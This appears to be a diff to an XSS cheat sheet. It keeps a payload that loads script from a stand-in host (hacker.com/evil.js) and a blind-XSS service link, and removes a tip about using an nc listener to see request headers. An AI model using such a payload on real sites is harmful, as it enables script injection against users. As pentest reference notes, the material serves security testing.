@@ -11,7 +11,6 @@
 
 #### External hacker-controlled script execution  
 `<script src='http://hacker.com/evil.js'></script>`  
-Trick: with nc listener, all HTTP request headers can also be seen when web server fetches remote js, possibly detecting other vulns, maybe CORS?
 
 ### Blind XSS
 `https://xsshunter.com/`  
